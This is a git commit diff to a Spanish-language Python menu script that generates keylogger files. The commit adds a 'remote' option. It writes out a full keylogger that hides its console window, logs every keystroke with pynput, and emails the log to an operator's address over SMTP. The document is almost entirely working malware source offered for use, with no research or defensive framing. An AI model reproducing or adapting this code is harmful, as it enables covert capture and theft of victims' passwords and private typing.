28fdb84dc0cb1cc3727f0f58a8e2dbfd914bd457
bl4ck44 <hackingbl4ck44@gmail.com>
2023-11-22 12:15:28 -0600

    Version 1

--- menu.py
+++ menu.py
@@ -8,8 +8,9 @@ os.system("clear && figlet Keylogger | lolcat")
 
 def menu_principal():
     while True:
-        print("\n[1] Crear keylogger")
-        print("[2] Salir")
+        print("\n[1] Crear keylogger Local")
+        print("[2] Crear keylogger Remoto")
+        print("[3] Salir")
         opcion = input("\033[1m\n[+] Ingrese una opción: \033[0m")
         if opcion == "1":
             codigo = '''from pynput import keyboard
@@ -37,11 +38,74 @@ def main():
 if __name__ == "__main__":
     main()
             '''
-            with open("keylogger.py", "w") as archivo:
+            with open("keylogger-local.py", "w") as archivo:
                 archivo.write(codigo)
-                print("\033[1m\n[+] Se ha creado el archivo 'keylogger.py'\033[0m")
+                print("\033[1m\n[+] Se ha creado el archivo 'keylogger-local.py'\033[0m")
         
         if opcion == "2":
+            codigo= '''from pynput import keyboard
+import win32console
+import win32gui
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+ventana = win32console.GetConsoleWindow()
+win32gui.ShowWindow(ventana, 0)
+
+# Configuración de correo electrónico
+smtp_server = "smtp.mail.yahoo.com"
+smtp_port = 587
+sender_email = "tu correo"
+sender_password = "tu contraseña"
+receiver_email = "correo donde vas a recibir el mensaje"
+
+def send_email():
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    message["Subject"] = "Archivo Keylogger"
+
+    with open("Keylogger.txt", "r") as file:
+        attachment = MIMEText(file.read())
+
+    attachment.add_header("Content-Disposition", "attachment", filename="Keylogger.txt")
+    message.attach(attachment)
+
+    try:
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(message)
+        print("Correo enviado con éxito.")
+    except smtplib.SMTPException as e:
+        print("Error al enviar el correo:", e)
+
+def on_press(key):
+    try:
+        with open("Keylogger.txt", "a") as f:
+            f.write(key.char)
+    except AttributeError:
+        with open("Keylogger.txt", "a") as f:
+            f.write(f" {key} ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        send_email()
+        return False
+
+def main():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
+        '''
+            with open("keylogger-remoto.py", "w") as archivo:
+                archivo.write(codigo)
+                print("\033[1m\n[+] Se ha creado el archivo 'keylogger-remoto.py'\033[0m")
+
+        if opcion == "3":
             break
 
 menu_principal()
